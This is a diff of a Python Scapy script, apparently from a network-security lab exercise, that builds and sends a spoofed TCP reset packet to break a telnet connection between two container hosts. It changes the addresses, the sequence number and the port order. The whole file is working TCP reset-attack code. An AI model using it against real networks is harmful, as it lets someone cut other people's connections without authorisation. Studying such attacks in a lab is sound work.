@@ -5,24 +5,22 @@ import sys
 
 # Fill with values found during analysis
 intSourcePort = 48638
-intNextSequenceNumber = 3531550224
+intNextSequenceNumber = 4089193648
 
 # Targeting victim/server container's telnet port
-strSourceIP = "10.9.0.1"
-strDestinationIP = "10.9.0.5"
+strSourceIP = "10.9.0.5"
+strDestinationIP = "10.9.0.6"
 intDestinationPort =  23
 
-while True:  # Run until CTRL+C
+# Build the IP layer of the packet
+lyrIP = IP(src=strSourceIP, dst=strDestinationIP)
 
-    # Build the IP layer of the packet
-    lyrIP = IP(src=strSourceIP, dst=strDestinationIP)
+# Build TCP layer of the packet
+lyrTCP = TCP(sport=intDestinationPort, dport=intSourcePort, flags="R", seq=intNextSequenceNumber)
 
-    # Build TCP layer of the packet
-    lyrTCP = TCP(sport=intSourcePort, dport=intDestinationPort, flags="R", seq=intNextSequenceNumber)
-    
-    # Build the full packet and show it
-    pktSynPacket = lyrIP / lyrTCP
-    pktSynPacket.show()
+# Build the full packet and show it
+pktResetPacket = lyrIP / lyrTCP
+pktResetPacket.show()
 
-    # Send the packet
-    send(pktSynPacket, verbose=0)
+# Send the packet
+send(pktResetPacket, verbose=0)
